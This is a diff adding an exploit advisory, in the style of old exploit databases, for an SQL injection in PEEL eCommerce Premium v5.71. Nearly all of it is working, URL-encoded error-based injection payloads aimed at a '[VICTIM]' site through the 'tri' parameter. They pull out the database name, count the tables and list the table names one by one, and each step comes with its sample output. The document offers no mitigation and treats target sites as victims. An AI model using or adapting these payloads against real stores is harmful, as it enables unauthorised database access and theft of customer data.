@@ -1,0 +1,50 @@
+============================================
+PEEL eCommerce Premium v5.71 - SQL Injection Vulnerability
+============================================
+~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[+] Author : KnocKout 
+[+] Greatz : DaiMon & ALL MUSLIM HACKERS!!
+[~] Contact : knockoutr@msn.com
+~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~Script : PEEL eCommerce Premium v5.71 
+~Software: www.peel.fr
+~Vulnerability Style : SQL Injection
+~INFO :    MySQL error based injection method can be used..
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+your Need meterials : Hex Conversion.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~ Explotation ~~~~~~~~~~~
+
+======== DATABASE NAME GET.. =========
+
+http://[Victim]/achat/cat-sieges-[VICTIM].html?tri=reference+and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20concat%280x7e,0x27,unhex%28hex%28database%28%29%29%29,0x27,0x7e%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1
+'peel_premium' database name[OK]
+
+==================================
+======= Table Numbers Get.. =====
+
+Table Numbers Get..
+
+http://[VICTIM]/achat/cat-sieges-[VICTIM].html?tri=reference+and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28SELECT%20concat%280x7e,0x27,count%28table_name%29,0x27,0x7e%29%20FROM%20%60information_schema%60.tables%20WHERE%20table_schema=0x7065656C5F7072656D69756D%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1
+'58' table numbers [OK]
+
+=================================
+
+                [+] Limit command use for table names Example.. [+]
+
+http://[VICTIM]/achat/cat-sieges-31.html?tri=reference+and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28SELECT%20distinct%20concat%280x7e,0x27,cast%28table_name%20as%20char%29,0x27,0x7e%29%20FROM%20information_schema.tables%20Where%20table_schema=0x7065656C5F7072656D69756D%20limit%200,1%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1
+http://[VICTIM]/achat/cat-sieges-31.html?tri=reference+and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28SELECT%20distinct%20concat%280x7e,0x27,cast%28table_name%20as%20char%29,0x27,0x7e%29%20FROM%20information_schema.tables%20Where%20table_schema=0x7065656C5F7072656D69756D%20limit%201,1%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1
+http://[VICTIM]/achat/cat-sieges-31.html?tri=reference+and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28SELECT%20distinct%20concat%280x7e,0x27,cast%28table_name%20as%20char%29,0x27,0x7e%29%20FROM%20information_schema.tables%20Where%20table_schema=0x7065656C5F7072656D69756D%20limit%203,1%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1
+
+limit 0,1
+limit 1,1
+limit 2,1
+ GO..
+limit 58,1 
+
+All Table Names [OK]
+
+==============================
+NOTE : 
+Victim site Explotation: cat-sieges-[Number].html?tri=referance[bySQL()]
+==========================
